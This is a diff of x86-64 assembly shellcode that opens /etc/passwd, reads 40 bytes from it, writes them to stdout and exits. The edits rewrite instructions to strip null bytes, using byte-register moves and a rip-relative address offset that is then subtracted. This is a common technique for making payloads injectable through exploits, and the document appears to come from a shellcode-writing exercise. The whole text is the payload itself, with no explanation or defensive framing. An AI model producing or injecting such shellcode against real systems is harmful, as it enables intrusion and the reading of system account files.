@@ -3,10 +3,9 @@
 		.text
 _start:
 		# open(/etc/passwd)
-		xor		%rax, %rax
-		inc		%rax
-		inc		%rax
-		mov		$path, %rdi
+		add		$2, %al
+		lea		path+0x4444444(%rip), %rdi
+		sub		$0x4444444, %rdi
 		xor		%rsi, %rsi
 		syscall
 
@@ -14,22 +13,22 @@ _start:
 		mov 	%rax, %rdi
 		sub 	$40, %rsp
 		lea 	0x08(%rsp), %rsi
-		mov		$40,%rdx
+		xor		%rdx, %rdx
+		mov		$40,%dl
 		xor 	%rax, %rax
 		syscall
 
 		# write(/etc/passwd)
 		xor		%rax, %rax                  # system call 1 is write
 		inc		%rax
-        xor		%rdi, %rdi					# file handle 1 is stdout
-		inc		%rdi                
+        mov		%rax, %rdi					# file handle 1 is stdout              
 	    mov		%rsp, %rsi
-        mov     $40, %rdx               # number of bytes
+		mov		$40,%dl               		# number of bytes
         syscall 
 
 		
 		# exit(0)
-		mov		$60, %rax
+		mov		$60, %al
 		xor 	%rdi, %rdi
 		syscall
 
